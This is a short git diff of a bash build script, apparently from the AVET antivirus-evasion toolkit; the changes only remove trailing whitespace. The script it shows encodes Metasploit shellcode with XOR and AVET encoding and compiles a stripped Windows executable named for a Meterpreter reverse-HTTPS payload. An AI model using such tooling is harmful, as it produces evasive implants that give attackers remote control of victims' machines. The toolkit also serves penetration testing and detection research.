@@ -1,8 +1,8 @@
-#!/bin/bash    
+#!/bin/bash
 
 
 #DESCRIPTION_START
-# Execute 64-bit shellcode. 
+# Execute 64-bit shellcode.
 # Uses XOR encoder from metasploit, as well as AVET encoding.
 #DESCRIPTION_END
 
@@ -57,7 +57,7 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode64
 
-# call make_avet, compile 
+# call make_avet, compile
 $win64_compiler -o output/avetenc_mtrprtrxor_revhttps_win64.exe source/avet.c
 strip output/avetenc_mtrprtrxor_revhttps_win64.exe
 
